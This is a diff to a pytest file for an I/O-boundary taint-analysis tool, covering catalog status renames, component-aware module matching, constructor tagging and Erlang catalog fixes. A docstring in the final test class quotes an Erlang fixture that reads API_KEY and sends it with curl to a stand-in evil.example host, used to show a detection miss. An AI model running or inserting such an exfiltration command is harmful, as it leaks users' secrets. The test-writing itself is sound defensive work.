@@ -550,11 +550,19 @@ class TestLoadCatalog:
         assert hit is not None
         assert hit.boundary == "net_send"
 
-        # Data is ambiguous without context (gin.Context.Data vs template.Data)
+        # `Data` is ambiguous without a module hint and must not match bare.
         assert catalog.lookup_with_module("Data", None) is None
-        # But with gin context, it matches
-        hit = catalog.lookup_with_module("Data", "gin")
+        # With one it does. This used to assert a `gin` hint matched
+        # gin.Context.Data, which was ENCODING A DEFECT (INV-safig): the
+        # framework rows declared a package-identifier module while the
+        # analyzer emits the import path, so `gin` is a hint no Go program can
+        # produce and the row was unreachable in production. Those rows now
+        # live in docs/io-primitives-overlays/go-web-frameworks.yaml, keyed on
+        # the real import path. The stdlib row that shares the name carries the
+        # same assertion without depending on a fabricated hint.
+        hit = catalog.lookup_with_module("Data", "net/smtp")
         assert hit is not None
+        assert hit.qualified_name == "net/smtp.Client.Data"
         assert hit.boundary == "net_send"
 
     def test_go_catalog_stdlib_log(self) -> None:
@@ -1025,8 +1033,9 @@ net_send:
 class TestCatalogStatus:
     """Plan C, PR B: catalog ``status`` + ``stdlib_provenance`` validation.
 
-    Catalogs declare ``status: complete | in_progress`` plus an optional
-    ``stdlib_provenance`` block.  ``status: complete`` (explicit OR
+    Catalogs declare ``status: provenance_declared | in_progress`` plus an
+    optional ``stdlib_provenance`` block.  ``status: provenance_declared``
+    (explicit OR
     defaulted when both ``status`` and ``stdlib_provenance`` are absent)
     REQUIRES a ``stdlib_provenance`` block whose ``source_url`` is an
     HTTPS URL whose hostname suffix-matches
@@ -1034,8 +1043,8 @@ class TestCatalogStatus:
     ``status: in_progress`` may omit provenance.
     """
 
-    def test_default_status_is_complete_when_absent(self) -> None:
-        # status defaulted; complete provenance provided ⇒ status="complete".
+    def test_default_status_is_provenance_declared_when_absent(self) -> None:
+        # status defaulted; valid provenance provided ⇒ the default applies.
         from hypergumbo_core.io_boundary import IoBoundaryCatalog
 
         data = {
@@ -1047,7 +1056,7 @@ class TestCatalogStatus:
             },
         }
         catalog = IoBoundaryCatalog._from_dict(data)
-        assert catalog.status == "complete"
+        assert catalog.status == "provenance_declared"
 
     def test_in_progress_status_does_not_require_provenance(self) -> None:
         from hypergumbo_core.io_boundary import IoBoundaryCatalog
@@ -1057,21 +1066,21 @@ class TestCatalogStatus:
         assert catalog.status == "in_progress"
         assert catalog.stdlib_provenance is None
 
-    def test_complete_status_requires_provenance_source_url(self) -> None:
+    def test_provenance_declared_status_requires_provenance_source_url(self) -> None:
         from hypergumbo_core.io_boundary import IoBoundaryCatalog
 
-        data = {"language": "fakelang", "status": "complete"}
+        data = {"language": "fakelang", "status": "provenance_declared"}
         with pytest.raises(ValueError, match="stdlib_provenance"):
             IoBoundaryCatalog._from_dict(data)
 
-    def test_complete_status_requires_provenance_when_block_present_but_no_url(
+    def test_provenance_declared_requires_provenance_when_block_has_no_url(
         self,
     ) -> None:
         from hypergumbo_core.io_boundary import IoBoundaryCatalog
 
         data = {
             "language": "fakelang",
-            "status": "complete",
+            "status": "provenance_declared",
             "stdlib_provenance": {"version": "3.13"},  # no source_url
         }
         with pytest.raises(ValueError, match="source_url"):
@@ -1082,7 +1091,7 @@ class TestCatalogStatus:
 
         data = {
             "language": "fakelang",
-            "status": "complete",
+            "status": "provenance_declared",
             "stdlib_provenance": {
                 "source_url": "http://docs.python.org/3.13/library/index.html",
                 "version": "3.13",
@@ -1097,7 +1106,7 @@ class TestCatalogStatus:
 
         data = {
             "language": "fakelang",
-            "status": "complete",
+            "status": "provenance_declared",
             "stdlib_provenance": {
                 "source_url": "https://evil.example.com/python/",
                 "version": "3.13",
@@ -1112,7 +1121,7 @@ class TestCatalogStatus:
 
         data = {
             "language": "fakelang",
-            "status": "complete",
+            "status": "provenance_declared",
             "stdlib_provenance": {
                 "source_url": "https://docs.python.org/3.13/library/index.html",
                 "version": "3.13",
@@ -1133,7 +1142,7 @@ class TestCatalogStatus:
 
         data = {
             "language": "fakelang",
-            "status": "complete",
+            "status": "provenance_declared",
             "stdlib_provenance": {
                 "source_url": "https://python.org/",
                 "version": "3.13",
@@ -1161,29 +1170,29 @@ class TestCatalogStatus:
         with pytest.raises(ValueError, match="stdlib_provenance"):
             IoBoundaryCatalog._from_dict(data)
 
-    def test_python_catalog_is_complete_with_provenance(self) -> None:
-        # The shipped Python catalog must declare status=complete with a
+    def test_python_catalog_is_provenance_declared(self) -> None:
+        # The shipped Python catalog must declare provenance_declared with a
         # valid stdlib_provenance block. This is the worked example.
         catalog = load_catalog("python")
-        assert catalog.status == "complete"
+        assert catalog.status == "provenance_declared"
         assert catalog.stdlib_provenance is not None
         assert catalog.stdlib_provenance["source_url"].startswith("https://")
 
-    def test_rust_catalog_is_complete_with_provenance(self) -> None:
+    def test_rust_catalog_is_provenance_declared(self) -> None:
         # WI-tukif batch 1: Rust catalog audited against doc.rust-lang.org/std/
         # 2026-05-24 (Rust 1.78 stable).
         catalog = load_catalog("rust")
-        assert catalog.status == "complete"
+        assert catalog.status == "provenance_declared"
         assert catalog.stdlib_provenance is not None
         assert catalog.stdlib_provenance["source_url"].startswith(
             "https://doc.rust-lang.org",
         )
 
-    def test_erlang_catalog_is_complete_with_provenance(self) -> None:
+    def test_erlang_catalog_is_provenance_declared(self) -> None:
         # WI-tukif batch 1: Erlang catalog audited against erlang.org/doc/
         # 2026-05-24 (OTP 26).
         catalog = load_catalog("erlang")
-        assert catalog.status == "complete"
+        assert catalog.status == "provenance_declared"
         assert catalog.stdlib_provenance is not None
         assert catalog.stdlib_provenance["source_url"].startswith(
             "https://erlang.org",
@@ -1448,6 +1457,130 @@ class TestModuleMatches:
         assert _module_matches("FileManager", "logger") is False
 
 
+class TestModuleMatchesIsComponentAware:
+    """WI-zazul: the predicate must not substring-match module paths.
+
+    It used to normalise ``::`` and ``/`` to ``.`` and then ask
+    ``cm in em or em in cm`` -- bidirectional, case-insensitive SUBSTRING
+    containment. 25 of the 210 catalog sink modules are four characters or
+    fewer (``os``, ``io``, ``fs``, ``net``, ``log``, ``http``, ``sys``, ...), so
+    each matched ANY module whose normalised path merely contained it.
+
+    Found by the 2026-08-01 taint cohort over 9 fresh external repos, which is
+    what moved INV-karud to ``violated``. Measured on hypergumbo's own tree the
+    predicate looked clean -- 110 flows, 110 realizable, 0 suspect -- and every
+    defect below is Go or JavaScript. It is a language-coverage gap that only
+    fresh substrate exposes.
+
+    The replacement is component-aware: normalise separators, split on ``.``,
+    and require one component sequence to be a PREFIX of the other. Where the
+    prefix is strict, the first EXTRA component decides -- capitalised means a
+    type inside the matched package (``os/exec`` + ``Cmd``), lowercase means a
+    sibling or sub-package (``net/http`` + ``fcgi``), which is a different
+    module and must not match. That discriminant is needed because the Go
+    analyzer emits ``os.exec.Cmd`` for what the catalog spells ``os/exec``, so
+    the separator itself cannot be trusted to mark the package boundary.
+    """
+
+    # (catalog_module, edge_module_hint, why) — every one of these returned
+    # True under substring containment.
+    @pytest.mark.parametrize(
+        "catalog,hint,why",
+        [
+            ("os", "chaos", "'os' is a substring of 'chaos'"),
+            ("io", "audio", "'io' is a substring of 'audio'"),
+            ("log", "dialog", "'log' is a substring of 'dialog'"),
+            ("fs", "dfs.client", "'fs' is a substring of 'dfs'"),
+            ("net/http", "net/http/fcgi", "fcgi is a SIBLING package, not a type"),
+            ("net/http", "net/http/httptest",
+             "httptest.NewRequest builds a request and performs NO network IO"),
+            ("net/smtp.Client", "net", "'net' is a prefix component only"),
+            ("grpc",
+             "go.opentelemetry.io/otel/exporters/otlp/otlptrace/otlptracegrpc",
+             "the module path merely ENDS in 'grpc'"),
+        ],
+    )
+    def test_substring_collisions_no_longer_match(
+        self, catalog: str, hint: str, why: str,
+    ) -> None:
+        assert _module_matches(catalog, hint) is False, (
+            f"{catalog!r} still matches {hint!r} — {why}"
+        )
+
+    def test_zone_flipping_collision(self) -> None:
+        """The one catalog-internal pair that changes the ZONE, not just the primitive.
+
+        ``sys.process.Process`` is host_fs and ``sys.process.ProcessBuilder`` is
+        subprocess, and the former is literally a substring of the latter, so a
+        Scala ``run`` could be attributed to the wrong zone entirely rather than
+        merely to the wrong primitive.
+        """
+        assert _module_matches(
+            "sys.process.Process", "sys.process.ProcessBuilder",
+        ) is False
+
+    @pytest.mark.parametrize(
+        "catalog,hint",
+        [
+            ("os", "os"),                          # identical
+            ("net.Conn", "net.Conn"),
+            ("java.io", "java.io.FileInputStream"),  # type within package
+            ("std::fs", "std::fs::File"),            # Rust path separator
+            ("os/exec", "os.exec.Cmd"),              # slash catalog, dotted hint
+            ("net/http", "net/http.Client"),         # exported type, not a package
+            # Dropped qualification — the hint is the unqualified tail. This is
+            # how source actually spells these, so it is load-bearing rather
+            # than lenient: Go writes `http.Get` after importing `net/http`,
+            # and Java writes `System.in` for `java.lang.System.in`.
+            ("java.lang.System", "System"),
+            ("net/http", "http"),
+            ("net.Conn", "Conn"),
+        ],
+    )
+    def test_legitimate_matches_survive(self, catalog: str, hint: str) -> None:
+        """Non-vacuity floor (L17): the fix must not be 'return False'.
+
+        Without these, deleting the predicate's body would satisfy every
+        assertion above.
+        """
+        assert _module_matches(catalog, hint) is True, (
+            f"{catalog!r} should still match {hint!r}"
+        )
+
+    @pytest.mark.parametrize(
+        "catalog,hint",
+        [
+            ("Channel", "channel"),
+            ("ChannelHandlerContext", "context"),
+            ("NonBlockingFileIO", "fileIO"),
+        ],
+    )
+    def test_swift_receiver_variable_carve_out_survives(
+        self, catalog: str, hint: str,
+    ) -> None:
+        """Swift hints are receiver VARIABLE names, so they need their own rule.
+
+        The analyzer extracts a camelCase variable where the catalog names a
+        PascalCase type, and the variable is frequently the type's trailing
+        word(s). Component matching cannot express that, so it is an explicit
+        carve-out — and its DIRECTION is the safety property: the catalog name
+        may end with the hint (a variable named after its type), never the
+        reverse. ``'chaos'.endswith('os')`` is the bug; ``'NonBlockingFileIO'
+        .endswith('fileIO')`` is the feature, and only one direction is allowed.
+        """
+        assert _module_matches(catalog, hint) is True
+
+    def test_swift_carve_out_requires_a_word_boundary(self) -> None:
+        """The carve-out is bounded, so it cannot re-admit the bug it excludes.
+
+        A suffix that starts mid-word is not a receiver variable named after
+        its type; requiring the split to land on a capital keeps the carve-out
+        from degenerating back into substring containment for short names.
+        """
+        assert _module_matches("os", "s") is False
+        assert _module_matches("Channel", "nel") is False
+
+
 class TestExtractModuleHint:
     """Tests for _extract_module_hint helper."""
 
@@ -1537,6 +1670,82 @@ class TestTagIoBoundaries:
         )
         count = tag_io_boundaries([edge], {"python": catalog})
         assert count == 0
+        assert edge.meta is None
+
+    def test_tags_a_constructor_call_to_an_io_primitive(self) -> None:
+        """INV-motos: a CONSTRUCTOR IS A CALL SITE.
+
+        ``instantiates`` was absent from ``call_types`` while the coverage
+        gate's ``_CALL_SITE_EDGE_TYPES`` carried it, so a constructor-shaped
+        catalogued primitive was counted EXAMINED by the gate and was
+        structurally untaggable here — and "no chains found" became
+        ``confirmed``. The dst shape is copied from a real survey of a
+        two-line fixture, not invented: python emits ``instantiates`` with
+        ``evidence_type: ast_new`` for ``subprocess.Popen([...])``.
+
+        Measured on the shipped CLI at filing, claim
+        ``{boundary: subprocess, must_not_exist: true}``::
+
+            subprocess.Popen([...])   ->  confirmed  rc 0   <- the defect
+            subprocess.run([...])     ->  violated   rc 1   <- the control
+
+        Same claim, adjacent catalogue rows, only the edge type differing.
+        """
+        catalog = load_catalog("python")
+        edge = self._make_edge(
+            src="python:/app/main.py:4-6:main:function",
+            dst="python:subprocess:0-0:Popen:external_symbol",
+            edge_type="instantiates",
+        )
+        count = tag_io_boundaries([edge], {"python": catalog})
+        assert count == 1, (
+            "a constructor that IS the I/O primitive went untagged; the gate "
+            "counts this edge as examined, so the chain is the only thing "
+            "standing between it and a false all-clear"
+        )
+        assert edge.meta is not None
+        assert edge.meta["io_boundary"] == "subprocess"
+        assert edge.meta["io_primitive"] == "subprocess.Popen"
+
+    def test_the_function_form_of_the_same_primitive_was_always_tagged(
+        self,
+    ) -> None:
+        """THE CONTROL for the test above, and the reason the defect hid.
+
+        ``subprocess.run`` and ``subprocess.Popen`` are adjacent rows in one
+        catalogue block with one boundary. The call-shaped one has always been
+        tagged, so every fixture and every corpus number written against
+        ``run`` looked correct while ``Popen`` was invisible.
+        """
+        catalog = load_catalog("python")
+        edge = self._make_edge(
+            src="python:/app/main.py:4-6:main:function",
+            dst="python:subprocess:0-0:run:external_symbol",
+        )
+        assert tag_io_boundaries([edge], {"python": catalog}) == 1
+        assert edge.meta is not None
+        assert edge.meta["io_boundary"] == "subprocess"
+
+    def test_a_constructor_that_is_not_a_primitive_is_still_not_tagged(
+        self,
+    ) -> None:
+        """NON-VACUITY / precision guard on the widening above.
+
+        Admitting ``instantiates`` must not turn every construction into a
+        boundary. ``pathlib.Path`` is the case to watch: the catalogue carries
+        19 rows under it and every one is ``kind: method``, so building a
+        ``Path`` — which performs no I/O — matches nothing, while
+        ``Path(p).write_text(x)`` is tagged on the method edge as before. If
+        this test ever fails, a ``Path``-shaped row was added at function kind
+        and every path construction in the corpus just became fs I/O.
+        """
+        catalog = load_catalog("python")
+        edge = self._make_edge(
+            src="python:/app/main.py:4-6:main:function",
+            dst="python:pathlib:0-0:Path:external_symbol",
+            edge_type="instantiates",
+        )
+        assert tag_io_boundaries([edge], {"python": catalog}) == 0
         assert edge.meta is None
 
     def test_skips_unknown_language(self) -> None:
@@ -3134,7 +3343,7 @@ class TestExternalPotentialBucket:
     ``fs_read`` / etc., without the catalog having to enumerate every
     popular wrapper.
 
-    The bucket is gated on ``status: complete`` for the source
+    The bucket is gated on ``status: provenance_declared`` for the source
     language's catalog: in_progress catalogs flag chains as
     ``dst_classification_unreliable=True`` so users see them but know
     the absence-of-catalog-hit isn't authoritative.
@@ -3400,7 +3609,7 @@ class TestExternalPotentialBucket:
         # external_potential — it's stdlib non-IO, not a catalog gap.
         catalog = IoBoundaryCatalog._from_dict({
             "language": "python",
-            "status": "complete",
+            "status": "provenance_declared",
             "stdlib_provenance": {
                 "source_url": "https://docs.python.org/3.13/library/index.html",
                 "version": "3.13",
@@ -3588,14 +3797,26 @@ class TestExternalPotentialBucket:
         """
         from hypergumbo_core.io_boundary import compute_boundary_map
 
-        # dst node's name is the qualified form `re.MULTILINE`; module hint
-        # is `re` (extracted from the 2nd colon-separated field).
-        dst = "python:re:0-0:re.MULTILINE:unresolved"
+        # dst node's name is the qualified form `requests.codes`; module hint
+        # is `requests` (extracted from the 2nd colon-separated field).
+        #
+        # FIXTURE MODULE CHANGED FROM ``re`` TO ``logging``, and the reason is
+        # worth recording because it is the mechanism working, not a
+        # workaround. This test is about dst-name PREPENDING; it never cared
+        # which module it used. It silently depended on the module being
+        # UNENUMERATED, because F3 Filter 2 skips external_potential entirely
+        # for a module whose I/O surface has been audited closed-world. The
+        # 2026-08-15 audit declared ``re`` enumerated and the stdlib climb
+        # did the same to ``logging`` HOURS later — a stdlib fixture here
+        # loses its subject every time the catalogue improves. A THIRD-PARTY
+        # name is the stable choice: the shipped catalogue is stdlib-scoped
+        # by ADR-0016 §27, so ``requests`` can never be enumerated by it.
+        dst = "python:requests:0-0:requests.codes:unresolved"
         edge = self._mock_edge(
             src="python:/app/main.py:5-10:f:function",
             dst=dst,
         )
-        nodes_by_id = {dst: self._boundary_node(dst, "re.MULTILINE")}
+        nodes_by_id = {dst: self._boundary_node(dst, "requests.codes")}
         bmap = compute_boundary_map(
             [edge],
             {"python": load_catalog("python")},
@@ -3603,8 +3824,8 @@ class TestExternalPotentialBucket:
         )
         ext = bmap.entries.get("external_potential")
         assert ext is not None and len(ext.chains) == 1
-        assert ext.chains[0].primitive == "re.MULTILINE", (
-            f"Expected 're.MULTILINE', got {ext.chains[0].primitive!r}"
+        assert ext.chains[0].primitive == "requests.codes", (
+            f"Expected 'requests.codes', got {ext.chains[0].primitive!r}"
         )
 
 
@@ -3827,7 +4048,7 @@ class TestAmbiguousNameFiltering:
     # --- Go ambiguous names ---
 
     def test_go_bare_run_not_matched(self) -> None:
-        """Go: bare 'Run' should NOT match gin.Engine.Run without module context."""
+        """Go: bare 'Run' must not match any Run row without module context."""
         catalog = load_catalog("go")
         edge = self._make_edge(
             src="go:/main.go:10:TestFoo:function",
@@ -3837,7 +4058,7 @@ class TestAmbiguousNameFiltering:
         assert count == 0, "Bare 'Run' is ambiguous (testing.T.Run, cobra.Command.Run)"
 
     def test_go_bare_string_not_matched(self) -> None:
-        """Go: bare 'String' should NOT match gin.Context.String without module context."""
+        """Go: bare 'String' must not match without module context."""
         catalog = load_catalog("go")
         edge = self._make_edge(
             src="go:/main.go:10:handler:function",
@@ -3867,14 +4088,24 @@ class TestAmbiguousNameFiltering:
         assert count == 0, "Bare 'Write' is ambiguous (io.Writer.Write on many types)"
 
     def test_go_qualified_run_still_matches(self) -> None:
-        """Go: 'Run' with gin.Engine module context should still match."""
+        """Go: 'Run' with an os/exec module context should still match.
+
+        The point of this test is that a module hint RESCUES an ambiguous short
+        name that ``test_go_bare_run_not_matched`` shows is refused bare — and
+        that point is unchanged. Only the example row moved: it used to use
+        ``go:gin.Engine:...`` , which was unreachable in production because the
+        catalogue spelled the module as a package identifier while the analyzer
+        emits the import path (INV-safig). Asserting against a row that could
+        never fire made this a test of the fixture rather than of the gate, so
+        it now uses a stdlib row the analyzer really does emit.
+        """
         catalog = load_catalog("go")
         edge = self._make_edge(
             src="go:/main.go:10:main:function",
-            dst="go:gin.Engine:0-0:Run:unresolved",
+            dst="go:os/exec:0-0:Run:unresolved",
         )
         count = tag_io_boundaries([edge], {"go": catalog})
-        assert count == 1, "Qualified 'Run' on gin.Engine should match"
+        assert count == 1, "Qualified 'Run' on os/exec should match"
 
     # --- Rust ambiguous names ---
 
@@ -4118,9 +4349,12 @@ class TestStdlibModulesAndFilter2:
     These tests pin the behavior of:
     - :attr:`IoBoundaryCatalog.stdlib_modules` (frozenset)
     - :attr:`IoBoundaryCatalog.stdlib_prefixes` (tuple)
-    - :attr:`IoBoundaryCatalog.stdlib_module_completeness` (dict)
+    - :attr:`IoBoundaryCatalog.module_completeness` (dict)
     - :meth:`IoBoundaryCatalog.is_stdlib_module` (exact + prefix)
-    - :meth:`IoBoundaryCatalog.is_stdlib_module_complete`
+    - :meth:`IoBoundaryCatalog.module_io_is_enumerated` (the closed-world
+      question, prefix-anchored; it replaced the exact-match
+      ``is_stdlib_module_complete`` so the coverage gate and Filter 2 ask
+      one predicate rather than two that can drift)
     - YAML parser for the new shapes (flat list AND list-of-dicts with
       ``completeness:``)
     - ``merge`` propagation for all three fields
@@ -4212,17 +4446,17 @@ class TestStdlibModulesAndFilter2:
         assert cat.is_stdlib_module("concurrent.futures")
         assert not cat.is_stdlib_module("requests.sessions")
 
-    def test_is_stdlib_module_complete_flag(self) -> None:
+    def test_module_io_is_enumerated_flag(self) -> None:
         cat = IoBoundaryCatalog(
             language="python",
             stdlib_modules=frozenset({"math", "os"}),
-            stdlib_module_completeness={"math": "2026-05-13"},
+            module_completeness={"math": "2026-05-13"},
         )
-        assert cat.is_stdlib_module_complete("math")
+        assert cat.module_io_is_enumerated("math")
         # Listed in stdlib_modules but not flagged complete.
-        assert not cat.is_stdlib_module_complete("os")
+        assert not cat.module_io_is_enumerated("os")
         # Not listed at all.
-        assert not cat.is_stdlib_module_complete("unknown")
+        assert not cat.module_io_is_enumerated("unknown")
 
     def test_from_yaml_parses_flat_list_of_strings(
         self, tmp_path: Path,
@@ -4238,7 +4472,7 @@ class TestStdlibModulesAndFilter2:
         )
         cat = IoBoundaryCatalog.from_yaml(yaml_path)
         assert cat.stdlib_modules == frozenset({"os", "sys", "re"})
-        assert cat.stdlib_module_completeness == {}
+        assert cat.module_completeness == {}
 
     def test_from_yaml_parses_list_of_dicts_with_completeness(
         self, tmp_path: Path,
@@ -4258,7 +4492,7 @@ class TestStdlibModulesAndFilter2:
         assert cat.stdlib_modules == frozenset(
             {"math", "os", "foo_should_be_ignored"},
         )
-        assert cat.stdlib_module_completeness == {"math": "2026-05-13"}
+        assert cat.module_completeness == {"math": "2026-05-13"}
 
     def test_from_yaml_rejects_completeness_without_retrieved(
         self, tmp_path: Path,
@@ -4289,7 +4523,7 @@ class TestStdlibModulesAndFilter2:
         cat = IoBoundaryCatalog.from_yaml(yaml_path)
         # Neither malformed entry contributes.
         assert cat.stdlib_modules == frozenset()
-        assert cat.stdlib_module_completeness == {}
+        assert cat.module_completeness == {}
 
     def test_from_yaml_parses_stdlib_prefixes(
         self, tmp_path: Path,
@@ -4326,13 +4560,13 @@ class TestStdlibModulesAndFilter2:
             language="kotlin",
             stdlib_modules=frozenset({"kotlin.collections"}),
             stdlib_prefixes=("kotlin",),
-            stdlib_module_completeness={"kotlin.collections": "2026-05-13"},
+            module_completeness={"kotlin.collections": "2026-05-13"},
         )
         parent = IoBoundaryCatalog(
             language="java",
             stdlib_modules=frozenset({"java.util"}),
             stdlib_prefixes=("java.io",),
-            stdlib_module_completeness={
+            module_completeness={
                 "kotlin.collections": "2024-01-01",  # parent loses on collision
                 "java.util": "2026-05-13",
             },
@@ -4344,7 +4578,7 @@ class TestStdlibModulesAndFilter2:
         # Child-first dedup preserved.
         assert merged.stdlib_prefixes == ("kotlin", "java.io")
         # Child wins on completeness-map collision.
-        assert merged.stdlib_module_completeness == {
+        assert merged.module_completeness == {
             "kotlin.collections": "2026-05-13",
             "java.util": "2026-05-13",
         }
@@ -4415,7 +4649,7 @@ class TestStdlibModulesAndFilter2:
             stdlib_other=catalog.stdlib_other,
             stdlib_modules=frozenset({"math"}),
             stdlib_prefixes=catalog.stdlib_prefixes,
-            stdlib_module_completeness={"math": "2026-05-13"},
+            module_completeness={"math": "2026-05-13"},
         )
         dst = "python:math:0-0:sqrt:unresolved"
         edge = self._make_edge_with_dst_ref(
@@ -4453,6 +4687,40 @@ class TestStdlibModulesAndFilter2:
         ext = bmap.entries.get("external_potential")
         assert ext is not None and len(ext.chains) == 1
 
+    def test_both_spellings_of_the_completeness_key_are_read_identically(
+        self, tmp_path: Path,
+    ) -> None:
+        """``module_completeness`` is canonical; ``stdlib_module_completeness``
+        is the deprecated alias, still read from SHIPPED catalogues.
+
+        Renaming a key that gates confirmability is exactly where a
+        "behaviour-neutral" refactor stops being neutral: drop the old spelling
+        and every curated catalogue silently loses its audit records, which
+        reads as a stricter gate rather than as a bug. Both spellings are
+        asserted against ONE expectation so they cannot drift apart, and the
+        alias is scoped to shipped catalogues — ``load_overlay_catalog``
+        refuses it, since a ``stdlib_*`` key in a third-party overlay describes
+        something the overlay is not describing.
+        """
+        results = []
+        for key in ("module_completeness", "stdlib_module_completeness"):
+            path = tmp_path / f"{key}.yaml"
+            path.write_text(
+                "language: python\n"
+                "status: in_progress\n"
+                f"{key}:\n"
+                "  - module: math\n"
+                "    completeness: complete\n"
+                '    retrieved: "2026-05-13"\n',
+                encoding="utf-8",
+            )
+            results.append(IoBoundaryCatalog.from_yaml(path).module_completeness)
+        assert results[0] == {"math": "2026-05-13"}
+        assert results[0] == results[1], (
+            "the deprecated spelling parsed differently from the canonical "
+            "one; a curated catalogue would silently lose its audit record"
+        )
+
     def test_from_yaml_parses_top_level_completeness_section(
         self, tmp_path: Path,
     ) -> None:
@@ -4481,13 +4749,26 @@ class TestStdlibModulesAndFilter2:
         )
         cat = IoBoundaryCatalog.from_yaml(yaml_path)
         # math is flagged complete.
-        assert cat.is_stdlib_module_complete("math")
+        assert cat.module_io_is_enumerated("math")
         # os listed but unflagged.
-        assert not cat.is_stdlib_module_complete("os")
-        # Auto-promotion: derived_auto_promoted appears only in the
-        # completeness section but is auto-added to stdlib_modules.
-        assert cat.is_stdlib_module("derived_auto_promoted")
-        assert cat.is_stdlib_module_complete("derived_auto_promoted")
+        assert not cat.module_io_is_enumerated("os")
+        # NO AUTO-PROMOTION. ``derived_auto_promoted`` appears only in the
+        # completeness section, and that section says "I enumerated this
+        # module's I/O" — not "this name ships with the interpreter". This
+        # assertion used to run the other way, and the promotion it pinned was
+        # a live route around the overlay guard: ADR-0016 forbids an overlay
+        # relabelling a PyPI package as stdlib ("would be a supply-chain
+        # misread rather than an I/O one") and ``load_overlay_catalog`` pops
+        # ``stdlib_modules`` to enforce it, but an overlay carrying only a
+        # ``module_completeness`` entry for ``requests`` still made
+        # ``is_stdlib_module("requests")`` answer True on the merged catalogue.
+        # Measured, with the ``stdlib_modules:`` spelling as the control —
+        # that one was correctly stripped.
+        assert not cat.is_stdlib_module("derived_auto_promoted")
+        assert cat.module_io_is_enumerated("derived_auto_promoted")
+        # The two facts stay independent in both directions: ``os`` ships with
+        # the interpreter and is not enumerated.
+        assert cat.is_stdlib_module("os")
 
     def test_from_yaml_top_level_completeness_rejects_missing_retrieved(
         self, tmp_path: Path,
@@ -4516,7 +4797,7 @@ class TestStdlibModulesAndFilter2:
             '    retrieved: "2026-05-13"\n',
         )
         cat = IoBoundaryCatalog.from_yaml(yaml_path)
-        assert cat.stdlib_module_completeness == {}
+        assert cat.module_completeness == {}
 
     def test_python_catalog_lists_stdlib_modules_and_math_complete(
         self,
@@ -4536,9 +4817,15 @@ class TestStdlibModulesAndFilter2:
             )
         # Long-tail non-stdlib should be absent.
         assert not cat.is_stdlib_module("requests")
-        # Worked-example closed-world flag is on math, NOT on os.
-        assert cat.is_stdlib_module_complete("math")
-        assert not cat.is_stdlib_module_complete("os")
+        # Closed-world flags: math since May, os since the 2026-08-15
+        # stdlib climb (full I/O surface rowed + dated audit). The
+        # counterexample keeping the assertion honest is now a module
+        # that is genuinely NOT enumerated: socket carries rows and no
+        # audit, and third-party requests carries neither.
+        assert cat.module_io_is_enumerated("math")
+        assert cat.module_io_is_enumerated("os")
+        assert not cat.module_io_is_enumerated("socket")
+        assert not cat.module_io_is_enumerated("requests")
 
     def test_filter_2_skips_only_when_module_hint_is_present(self) -> None:
         """No module_hint (``module_hint == "external"``) → Filter 2 cannot fire.
@@ -4560,7 +4847,7 @@ class TestStdlibModulesAndFilter2:
             stdlib_other=catalog.stdlib_other,
             stdlib_modules=frozenset({"math"}),
             stdlib_prefixes=catalog.stdlib_prefixes,
-            stdlib_module_completeness={"math": "2026-05-13"},
+            module_completeness={"math": "2026-05-13"},
         )
         dst = "python:external:0-0:Mystery:unresolved"
         edge = self._make_edge_with_dst_ref(
@@ -5017,15 +5304,16 @@ class TestInProgressLanguages:
 
     def test_selects_only_in_progress_catalogs(self) -> None:
         from hypergumbo_core.io_boundary import in_progress_languages
-        # python / rust / erlang ship status: complete; go / java ship in_progress.
+        # python / rust / erlang ship status: provenance_declared; go / java
+        # ship in_progress.
         result = in_progress_languages(
             ["python", "go", "rust", "java", "erlang"]
         )
         assert result == ["go", "java"]
 
     def test_excludes_unsupported_language(self) -> None:
-        """A language with no catalog (is_supported=False, status defaults to
-        'complete') is NOT flagged in_progress — it carries the separate
+        """A language with no catalog (is_supported=False, status takes the
+        dataclass default) is NOT flagged in_progress — it carries the separate
         unsupported signal (INV-javam)."""
         from hypergumbo_core.io_boundary import in_progress_languages
         assert in_progress_languages(["klingon"]) == []
@@ -5079,3 +5367,656 @@ class TestGrpcRpcImplementationTraceability:
         assert rev.get("py:server:1-1:impl:function") == {
             "py:client:1-1:call:function"}
         assert "py:y:1-1:i:function" not in rev
+
+
+class TestTheBeamShellOutIsASubprocessNotAnEnvRead:
+    """WI-jupaf. ``os:cmd/1`` is Erlang's shell-out — it runs a command through
+    the OS shell — and it was catalogued as an ENVIRONMENT READ and WRITE,
+    sitting beside ``getenv`` and ``putenv``. It looks like ``cmd`` was swept
+    along with the rest of the ``os`` module.
+
+    MEASURED ON THE SHIPPED CLI BEFORE THE FIX, which is what turns this from a
+    tidiness complaint into a false-confirm:
+
+        -module(leak).
+        handler() ->
+            Secret = os:getenv("API_KEY"),
+            os:cmd("curl -d " ++ Secret ++ " https://evil.example/p").
+
+        claim {boundary: subprocess, must_not_exist: true}
+          -> Verdict: CONFIRMED, rc 0, "No subprocess chains found."
+
+    The call is not invisible — that would merely be a recall miss. It is
+    CLASSIFIED, as ``env_read``, and since INV-buzab a classified call is what
+    ``examined`` means. So the exfiltration is reported as an EXAMINED NEGATIVE
+    for the boundary that is actually true, with ``high_risk: false``. That is
+    the INV-gahuz / INV-larol shape reached from the opposite direction: there a
+    row STRIPPED opacity a launch needed, here a row asserts the wrong kind of
+    I/O entirely.
+
+    A first version of this measurement was confounded and is recorded because
+    the confound flattered the tool: a fixture that ALSO called
+    ``erlang:open_port`` returned ``inconclusive`` rc 2 — not because the launch
+    was detected, but because ``erlang`` is itself an uncatalogued module and
+    tripped the coverage gate. Removing ``open_port`` isolates ``os:cmd`` and
+    the verdict is a clean false ``confirmed``.
+
+    EMISSION SHAPE WAS MEASURED FIRST, as the item demanded, because adding rows
+    the analyzer can never match is a ceiling rather than a payoff (INV-linub's
+    L2-only fix measured as a win at the analyzer and produced zero findings).
+    The Erlang analyzer emits ``erlang:os:0-0:cmd:external_symbol`` with
+    ``call_construct='remote_external'`` — module slot ``os``, name slot
+    ``cmd`` — and the POSITIVE CONTROL is that the existing (wrong) row already
+    matches it end to end, producing an ``env_read`` chain. The key resolves;
+    only the boundary was wrong.
+    """
+
+    def test_erlang_os_cmd_is_a_subprocess_launch(self) -> None:
+        cat = load_catalog("erlang")
+        got = cat.lookup_with_module("os.cmd", "os")
+        assert got is not None, "os.cmd must stay catalogued — this is a RE-KEY"
+        assert got.boundary == "subprocess", (
+            f"os:cmd/1 runs a command through the OS shell; it is not an "
+            f"environment read. Got boundary={got.boundary!r}"
+        )
+
+    def test_erlang_open_port_is_a_subprocess_launch(self) -> None:
+        """``erlang:open_port/2`` is the other launch primitive, and the one
+        ``os:cmd`` is implemented on top of. It was catalogued nowhere at all,
+        so it produced no chain of any kind.
